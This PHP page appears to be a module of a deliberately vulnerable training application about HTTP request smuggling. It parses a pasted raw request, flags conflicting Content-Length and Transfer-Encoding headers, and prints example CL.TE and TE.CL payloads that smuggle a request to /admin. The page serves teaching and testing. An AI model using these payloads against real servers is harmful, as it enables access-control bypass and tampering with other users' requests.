<?php

$smugglingHtml = "";

// VULNERABLE: No validation of Content-Length and Transfer-Encoding headers
// Simulates a vulnerable proxy/backend that trusts both headers

if( isset( $_POST['test_request'] ) ) {
	$request_data = $_POST['request_data'];
	
	// Parse headers from raw request
	$lines = explode("\n", $request_data);
	$headers_info = [];
	
	$has_cl = false;
	$has_te = false;
	$cl_value = 0;
	$te_value = "";
	
	foreach($lines as $line) {
		$line = trim($line);
		if(stripos($line, 'Content-Length:') === 0) {
			$has_cl = true;
			$cl_value = trim(substr($line, 15));
			$headers_info[] = "Found Content-Length: $cl_value";
		}
		if(stripos($line, 'Transfer-Encoding:') === 0) {
			$has_te = true;
			$te_value = trim(substr($line, 18));
			$headers_info[] = "Found Transfer-Encoding: $te_value";
		}
	}
	
	$smugglingHtml .= "<div class=\"vulnerable_code_area\">";
	$smugglingHtml .= "<h3>Request Analysis</h3>";
	
	if($has_cl && $has_te) {
		$smugglingHtml .= "<div style=\"background: #ffe6e6; padding: 15px; border: 2px solid #ff0000; border-radius: 5px; margin: 10px 0;\">";
		$smugglingHtml .= "<h4 style=\"color: #cc0000;\">⚠️ VULNERABLE: Conflicting Headers Detected!</h4>";
		$smugglingHtml .= "<p><strong>Both Content-Length and Transfer-Encoding are present!</strong></p>";
		$smugglingHtml .= "<p>This can cause desynchronization between frontend and backend servers.</p>";
		$smugglingHtml .= "<ul>";
		foreach($headers_info as $info) {
			$smugglingHtml .= "<li>" . htmlspecialchars($info) . "</li>";
		}
		$smugglingHtml .= "</ul>";
		$smugglingHtml .= "<p><strong>Attack Scenario:</strong></p>";
		$smugglingHtml .= "<ul>";
		$smugglingHtml .= "<li>If frontend uses Content-Length ($cl_value bytes) but backend uses Transfer-Encoding ($te_value)</li>";
		$smugglingHtml .= "<li>Attacker can smuggle a second request in the body</li>";
		$smugglingHtml .= "<li>The smuggled request will be processed as the next user's request</li>";
		$smugglingHtml .= "</ul>";
		$smugglingHtml .= "</div>";
	} else if($has_cl) {
		$smugglingHtml .= "<p>✓ Only Content-Length header found: $cl_value</p>";
	} else if($has_te) {
		$smugglingHtml .= "<p>✓ Only Transfer-Encoding header found: $te_value</p>";
	} else {
		$smugglingHtml .= "<p>No body length headers found.</p>";
	}
	
	$smugglingHtml .= "<h4>Your Raw Request:</h4>";
	$smugglingHtml .= "<pre style=\"background: #f5f5f5; padding: 10px; border: 1px solid #ccc;\">" . htmlspecialchars($request_data) . "</pre>";
	$smugglingHtml .= "</div>";
}

$smugglingHtml .= "
<form method=\"POST\" style=\"margin-top: 20px;\">
	<fieldset>
		<legend>Test HTTP Request</legend>
		<p>Enter a raw HTTP request to test for smuggling vulnerabilities:</p>
		<textarea name=\"request_data\" rows=\"15\" cols=\"80\" style=\"font-family: monospace; width: 100%; max-width: 800px;\">POST /api/process HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-site.com

</textarea>
		<p>
			<button type=\"submit\" name=\"test_request\">Analyze Request</button>
		</p>
		<p style=\"color: #666;\"><em>Try modifying Content-Length and Transfer-Encoding headers to see how conflicting headers can be exploited.</em></p>
	</fieldset>
</form>

<div style=\"margin-top: 20px; padding: 15px; background: #e7f3ff; border: 1px solid #2196f3; border-radius: 5px;\">
	<h4>Example Smuggling Payloads:</h4>
	<p><strong>CL.TE Attack:</strong> Frontend uses Content-Length, Backend uses Transfer-Encoding</p>
	<pre style=\"background: white; padding: 10px; overflow-x: auto;\">POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 45
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost

</pre>
	<p><strong>TE.CL Attack:</strong> Frontend uses Transfer-Encoding, Backend uses Content-Length</p>
	<pre style=\"background: white; padding: 10px; overflow-x: auto;\">POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 6
Transfer-Encoding: chunked

3c
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
0

</pre>
</div>";

?>
